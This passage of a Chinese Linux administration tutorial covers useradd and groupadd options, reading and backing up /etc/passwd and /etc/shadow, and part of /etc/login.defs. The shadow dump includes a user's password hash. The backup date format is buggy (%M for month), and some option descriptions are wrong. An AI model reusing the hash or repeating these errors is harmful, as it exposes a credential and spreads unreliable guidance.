YYYY-MM-DD。</li><li><code>-f</code>：用于指定用户账号的失效前警告天数。</li><li><code>-g</code>：用于指定用户的初始主组。</li><li><code>-G</code>：用于指定用户的附加组。</li><li><code>-m</code>：用于自动创建用户的家目录。</li><li><code>-M</code>：用于不创建用户的家目录。</li><li><code>-n</code>：用于创建用户时，不要将用户的用户名作为主目录名。</li><li><code>-r</code>：用于创建系统用户。</li><li><code>-s</code>：用于指定用户的默认 shell。</li><li><code>-u</code>：用于指定用户的 UID。</li></ul><p>除了上述常用参数外，<code>useradd</code> 命令还有一些其他的参数，可以通过 <code>man useradd</code> 命令查看。需要注意的是，使用 <code>useradd</code> 命令时需要具有管理员权限。</p><p><strong>示例</strong>：可以使用以下命令同时使用 <code>-d</code> 和 <code>-g</code> 参数来创建一个新用户，并指定该用户的家目录和初始主组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo useradd -d /home/testuser -g testgroup testuser</span><br></pre></td></tr></table></figure><p>以上命令会创建一个名为 <code>testuser</code> 的新用户，将其家目录设置为 <code>/home/testuser</code>，并将其初始主组设置为 <code>testgroup</code>。请注意，使用这些命令时需要管理员权限。</p><h2 id="groupadd"><a href="#groupadd" class="headerlink" title="groupadd"></a>groupadd</h2><p><code>groupadd</code> 命令是用于创建新用户组的命令。下面是 <code>groupadd</code> 命令的常用参数：</p><ul><li><code>-f</code>：用于强制创建用户组，即使该用户组已经存在。</li><li><code>-g</code>：用于指定用户组的 GID。</li><li><code>-K</code>：用于指定用户组的默认属性，可以使用 <code>-o</code> 参数覆盖默认属性。</li><li><code>-o</code>：用于允许创建 GID 相同的用户组。</li><li><code>-p</code>：用于指定用户组的密码，该参数不常用。</li></ul><p>除了上述常用参数外，<code>groupadd</code> 命令还有一些其他的参数，可以通过 <code>man groupadd</code> 命令查看。需要注意的是，使用 <code>groupadd</code> 命令时需要具有管理员权限。</p><p><strong>示例</strong>：演示如何使用 <code>groupadd</code> 命令创建一个新用户组 <code>testgroup</code>，并将其 GID 设置为 1001：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd -g 1001 testgroup</span><br></pre></td></tr></table></figure><p>以上命令会创建一个名为 <code>testgroup</code> 的新用户组，并将其 GID 设置为 1001。</p><h1 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h1><h2 id="grep-bash-etc-passwd-awk-F-quot-quot-39-print-1-3-4-6-39"><a href="#grep-bash-etc-passwd-awk-F-quot-quot-39-print-1-3-4-6-39" class="headerlink" title="grep bash /etc/passwd | awk -F &quot;:&quot; &#39;{print $1,$3,$4,$6}&#39;"></a><code>grep bash /etc/passwd | awk -F &quot;:&quot; &#39;&#123;print $1,$3,$4,$6&#125;&#39;</code></h2><p>这个命令的目的是在文件/etc/passwd中搜索包含字符串”bash”的行，并使用awk命令提取并打印匹配行中的第1、第3、第4和第6个字段（以”:”作为分隔符）。</p><p>首先，grep命令用于搜索包含字符串”bash”的行。它将从/etc/passwd文件中找到所有包含”bash”的行，并将它们传递给下一个命令。</p><p>然后，管道符（|）将grep的输出作为awk命令的输入。awk命令使用-F选项来指定字段分隔符为”:”，然后使用单引号将打印命令括起来。</p><p>在打印命令中，$1代表第一个字段（用户名），$3代表第三个字段（用户ID），$4代表第四个字段（组ID），$6代表第六个字段（家目录）。awk命令将这些字段打印出来，每个字段之间用空格分隔。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kylin-vmwarevirtualplatform:~# grep bash /etc/passwd | awk -F &quot;:&quot; &#x27;&#123;print $1,$3,$4,$6&#125;&#x27;</span><br><span class="line">root 0 0 /root</span><br><span class="line">kylin 1000 1000 /home/kylin</span><br></pre></td></tr></table></figure><p>因此，这个命令的输出将是那些默认shell为”bash”的用户的用户名、用户ID、组ID和家目录。</p><h3 id="etc-passwd文件"><a href="#etc-passwd文件" class="headerlink" title="/etc/passwd文件"></a>/etc/passwd文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@kylin-vmwarevirtualplatform:~# cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">messagebus:x:101:101::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:102:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:103:104:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:104:105:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:105:106:systemd Core Dumper,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">syslog:x:106:111::/home/syslog:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:107:115:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">strongswan:x:109:65534::/var/lib/strongswan:/usr/sbin/nologin</span><br><span class="line">cups-pk-helper:x:110:118:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin</span><br><span class="line">lightdm:x:111:119:Light Display Manager:/var/lib/lightdm:/bin/false</span><br><span class="line">sshd:x:112:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">xrdp:x:113:121::/run/xrdp:/usr/sbin/nologin</span><br><span class="line">avahi:x:114:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">pulse:x:115:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin</span><br><span class="line">saned:x:116:126::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">hplip:x:117:7:HPLIP system user,,,:/run/hplip:/bin/false</span><br><span class="line">colord:x:118:127:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">nvidia-persistenced:x:119:128:NVIDIA Persistence Daemon,,,:/nonexistent:/usr/sbin/nologin</span><br><span class="line">geoclue:x:120:130::/var/lib/geoclue:/usr/sbin/nologin</span><br><span class="line">uuidd:x:121:131::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">kylin:x:1000:1000:kylin:/home/kylin:/bin/bash</span><br><span class="line">mysql:x:122:132:MySQL Server,,,:/nonexistent:/bin/false</span><br></pre></td></tr></table></figure><p><strong>文件/etc/passwd中包含字符串”bash”的行通常是指用户的登录shell设置为bash的行。</strong>在Linux系统中，/etc/passwd文件是存储用户账户信息的文件，每行代表一个用户账户。每行由多个字段组成，字段之间使用冒号(:)进行分隔。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kylin-vmwarevirtualplatform:~# grep bash /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">kylin:x:1000:1000:kylin:/home/kylin:/bin/bash</span><br></pre></td></tr></table></figure><p>对于包含字符串”bash”的行，可以根据字段的位置和含义来描述其特点：</p><ol><li>第一个字段是用户名：通常是用户登录系统时使用的用户名。</li><li>第二个字段是密码占位符：通常是一个字母x，表示密码存储在其他文件中，而不是直接存储在/etc/passwd文件中。</li><li>第三个字段是用户ID（UID）：唯一标识用户的数字值。</li><li>第四个字段是组ID（GID）：指定用户所属的主要组。</li><li>第五字段是用户信息字段：通常是用户的全名或注释。</li><li>第六字段是用户主目录：表示用户的主目录路径。</li><li>第七字段是登录shell：表示用户登录时使用的shell程序。</li></ol><p>对于包含字符串”bash”的行，第七个字段的值将是”/bin/bash”或类似的路径，表示该用户的登录shell是bash。这是bash作为默认shell的常见设置。</p><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><p>在Linux中，Bash（Bourne Again SHell）是一种命令行解释器（shell）。它是一个广泛使用的开源Unix shell，也是许多Linux发行版和其他Unix-like系统的默认shell。Bash提供了一个用户与操作系统交互的界面，允许用户执行命令、运行脚本以及管理文件系统和其他系统资源。</p><p>以下是Bash的一些主要特点和功能：</p><ol><li><p><strong>命令解释器：</strong> Bash是一个命令行解释器，它解释用户输入的命令并将其传递给操作系统执行。</p></li><li><p><strong>脚本语言支持：</strong> Bash也是一种脚本语言，用户可以编写Shell脚本以自动执行一系列命令。这使得Bash成为系统管理员和开发人员自动化任务的强大工具。</p></li><li><p><strong>变量和环境变量：</strong> Bash支持变量，用户可以使用变量来存储和检索数据。环境变量是一种特殊类型的变量，对整个系统可见，影响用户会话和程序的行为。</p></li><li><p><strong>管道和重定向：</strong> Bash允许使用管道（|）将一个命令的输出传递给另一个命令，以及使用重定向符号（&gt;、&lt;）来控制输入和输出流的方向。</p></li><li><p><strong>条件语句和循环：</strong> Bash支持条件语句（if-else）和循环（for、while），使得用户能够根据条件执行不同的命令或多次执行一组命令。</p></li><li><p><strong>通配符和正则表达式：</strong> Bash支持通配符（例如，* 和 ?）和正则表达式，用于进行文件名匹配和模式匹配。</p></li><li><p><strong>命令历史：</strong> Bash会保存用户执行过的命令历史记录，可以通过方向键或者使用<code>history</code>命令来检索和重新执行之前执行过的命令。</p></li><li><p><strong>别名：</strong> 用户可以使用别名为常用命令创建简短的替代名称，以便更快地输入和执行命令。</p></li></ol><p>总体而言，Bash是一个功能强大的工具，为用户提供了灵活的方式来与Linux系统进行交互和管理。</p><h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp -p /etc/passwd /root/backup/passwd_bak_`date +%Y%M%d`</span><br><span class="line"></span><br><span class="line">cp -p /etc/shadow /root/backup/shadow_bak_`date +%Y%M%d`</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@kylin-vmwarevirtualplatform:~/backup# cp -p /etc/passwd /root/backup/passwd_bak_`date +%Y%m%d`</span><br><span class="line">root@kylin-vmwarevirtualplatform:~/backup# ll</span><br><span class="line">总用量 12</span><br><span class="line">drwxr-xr-x 2 root root 4096 12月 19 12:48 ./</span><br><span class="line">drwx------ 8 root root 4096 12月 19 12:06 ../</span><br><span class="line">-rw-r--r-- 1 root root 2465 12月  4 16:58 passwd_bak_20231219</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kylin-vmwarevirtualplatform:~/backup# cp -p /etc/shadow /root/backup/shadow_bak_`date +%Y%M%d`</span><br><span class="line">root@kylin-vmwarevirtualplatform:~/backup# ll</span><br><span class="line">总用量 16</span><br><span class="line">drwxr-xr-x 2 root root   4096 12月 19 12:53 ./</span><br><span class="line">drwx------ 8 root root   4096 12月 19 12:06 ../</span><br><span class="line">-rw-r--r-- 1 root root   2465 12月  4 16:58 passwd_bak_20231219</span><br><span class="line">-rw-r----- 1 root shadow 1316 12月  4 16:58 shadow_bak_20235319</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>PS:命令里边日期附近的符号是``</strong></p><p>和md文档的这个<code>这个符号</code>一样。 </p><h3 id="etc-shadow文件"><a href="#etc-shadow文件" class="headerlink" title="/etc/shadow文件"></a>/etc/shadow文件</h3><p><code>/etc/shadow</code> 是一个重要的系统文件，它存储了系统用户的加密密码和其他与账户安全相关的信息。这个文件通常只有 root 用户或具有特殊权限的用户才能访问。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@kylin-vmwarevirtualplatform:~# cat /etc/shadow</span><br><span class="line">root:*:19125:0:99999:7:::</span><br><span class="line">daemon:*:19125:0:99999:7:::</span><br><span class="line">bin:*:19125:0:99999:7:::</span><br><span class="line">sys:*:19125:0:99999:7:::</span><br><span class="line">sync:*:19125:0:99999:7:::</span><br><span class="line">games:*:19125:0:99999:7:::</span><br><span class="line">man:*:19125:0:99999:7:::</span><br><span class="line">lp:*:19125:0:99999:7:::</span><br><span class="line">mail:*:19125:0:99999:7:::</span><br><span class="line">news:*:19125:0:99999:7:::</span><br><span class="line">uucp:*:19125:0:99999:7:::</span><br><span class="line">proxy:*:19125:0:99999:7:::</span><br><span class="line">www-data:*:19125:0:99999:7:::</span><br><span class="line">backup:*:19125:0:99999:7:::</span><br><span class="line">list:*:19125:0:99999:7:::</span><br><span class="line">irc:*:19125:0:99999:7:::</span><br><span class="line">gnats:*:19125:0:99999:7:::</span><br><span class="line">nobody:*:19125:0:99999:7:::</span><br><span class="line">_apt:*:19125:0:99999:7:::</span><br><span class="line">messagebus:*:19125:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19125:0:99999:7:::</span><br><span class="line">systemd-network:*:19125:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19125:0:99999:7:::</span><br><span class="line">systemd-coredump:*:19125:0:99999:7:::</span><br><span class="line">syslog:*:19125:0:99999:7:::</span><br><span class="line">avahi-autoipd:*:19125:0:99999:7:::</span><br><span class="line">dnsmasq:*:19125:0:99999:7:::</span><br><span class="line">strongswan:*:19125:0:99999:7:::</span><br><span class="line">cups-pk-helper:*:19125:0:99999:7:::</span><br><span class="line">lightdm:*:19125:0:99999:7:::</span><br><span class="line">sshd:*:19125:0:99999:7:::</span><br><span class="line">xrdp:!:19125:0:99999:7:::</span><br><span class="line">avahi:*:19125:0:99999:7:::</span><br><span class="line">pulse:*:19125:0:99999:7:::</span><br><span class="line">saned:*:19125:0:99999:7:::</span><br><span class="line">hplip:*:19125:0:99999:7:::</span><br><span class="line">colord:*:19125:0:99999:7:::</span><br><span class="line">nvidia-persistenced:*:19125:0:99999:7:::</span><br><span class="line">geoclue:*:19125:0:99999:7:::</span><br><span class="line">uuidd:*:19125:0:99999:7:::</span><br><span class="line">kylin:$6$Rnb7Xyd9Codc11D6$mhH99JHib1QMp5Et.iYBDEmPR8bu6aU5culTmQNb6CC9u6lvibD2ODkZFv222d7jH.S429EvsxKxlUygaUT9E/:19695:0:99999:7:::</span><br><span class="line">mysql:!:19695:0:99999:7:::</span><br></pre></td></tr></table></figure><p><code>/etc/shadow</code> 文件的每一行代表一个用户账户，字段之间使用冒号（:）分隔。</p><p>以下是 <code>/etc/shadow</code> 文件的字段说明：</p><ol><li>用户名：表示用户的登录名。</li><li>密码：经过加密的用户密码。在大多数情况下，密码字段会显示为一串乱码或星号（*），表示密码已经被加密并存储在此处。</li><li>最后一次修改密码的日期：表示用户最后一次更改密码的日期，以自 1970 年 1 月 1 日以来的天数计算。</li><li>密码过期天数：表示密码过期之前的天数。如果为 0，则表示密码已经过期。</li><li>密码过期提前警告天数：表示在密码过期之前多少天开始提醒用户更改密码。</li><li>密码不可用天数：表示在用户更改密码后，密码将在多少天内无法使用。</li><li>密码到期日期：表示密码将在哪一天过期，以自 1970 年 1 月 1 日以来的天数计算。</li><li>保留字段：保留供将来使用的字段。</li></ol><p>请注意，由于 <code>/etc/shadow</code> 文件涉及到用户密码和账户安全信息，只有具有足够权限的用户才能查看和修改该文件。在进行任何更改之前，请确保你了解系统的安全性和操作规范。</p><h2 id="口令策略和口令有效期"><a href="#口令策略和口令有效期" class="headerlink" title="口令策略和口令有效期"></a>口令策略和口令有效期</h2><h3 id="etc-login-defs文件"><a href="#etc-login-defs文件" class="headerlink" title="/etc/login.defs文件"></a>/etc/login.defs文件</h3><p><code>/etc/login.defs</code> 文件是一个配置文件，它包含了与用户登录相关的默认设置。在 Linux 系统中，该文件用于定义用户账户的默认值和限制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br></pre></td><td class="code"><pre><span class="line">root@kylin-vmwarevirtualplatform:~# cat /etc/login.defs</span><br><span class="line">#</span><br><span class="line"># /etc/login.defs - Configuration control definitions for the login package.</span><br><span class="line">#</span><br><span class="line"># Three items must be defined:  MAIL_DIR, ENV_SUPATH, and ENV_PATH.</span><br><span class="line"># If unspecified, some arbitrary (and possibly incorrect) value will</span><br><span class="line"># be assumed.  All other items are optional - if not specified then</span><br><span class="line"># the described action or option will be inhibited.</span><br><span class="line">#</span><br><span class="line"># Comment lines (lines beginning with &quot;#&quot;) and blank lines are ignored.</span><br><span class="line">#</span><br><span class="line"># Modified for Linux.  --marekm</span><br><span class="line"></span><br><span class="line"># REQUIRED for useradd/userdel/usermod</span><br><span class="line">#   Directory where mailboxes reside, _or_ name of file, relative to the</span><br><span class="line">#   home directory.  If you _do_ define MAIL_DIR and MAIL_FILE,</span><br><span class="line">#   MAIL_DIR takes precedence.</span><br><span class="line">#</span><br><span class="line">#   Essentially:</span><br><span class="line">#      - MAIL_DIR defines the location of users mail spool files</span><br><span class="line">#        (for mbox use) by appending the username to MAIL_DIR as defined</span><br><span class="line">#        below.</span><br><span class="line">#      - MAIL_FILE defines the location of the users mail spool files as the</span><br><span class="line">#        fully-qualified filename obtained by prepending the user home</span><br><span class="line">#        directory before $MAIL_FILE</span><br><span class="line">#</span><br><span class="line"># NOTE: This is no more used for setting up users MAIL environment variable</span><br><span class="line">#       which is, starting from shadow 4.0.12-1 in Debian, entirely the</span><br><span class="line">#       job of the pam_mail PAM modules</span><br><span class="line">#       See default PAM configuration files provided for</span><br><span class="line">#       login, su, etc.</span><br><span class="line">#</span><br><span class="line"># This is a temporary situation: setting these variables will soon</span><br><span class="line"># move to /etc/default/useradd and the variables will then be</span><br><span class="line"># no more supported</span><br><span class="line">MAIL_DIR        /var/mail</span><br><span class="line">#MAIL_FILE      .mail</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Enable logging and display of /var/log/faillog login failure info.</span><br><span class="line"># This option conflicts with the pam_tally PAM module.</span><br><span class="line">#</span><br><span class="line">FAILLOG_ENAByes</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Enable display of unknown usernames when login failures are recorded.</span><br><span class="line">#</span><br><span class="line"># WARNING: Unknown usernames may become world readable. </span><br><span class="line"># See #290803 and #298773 for details about how this could become a security</span><br><span class="line"># concern</span><br><span class="line">LOG_UNKFAIL_ENABno</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Enable logging of successful logins</span><br><span class="line">#</span><br><span class="line">LOG_OK_LOGINSno</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Enable &quot;syslog&quot; logging of su activity - in addition to sulog file logging.</span><br><span class="line"># 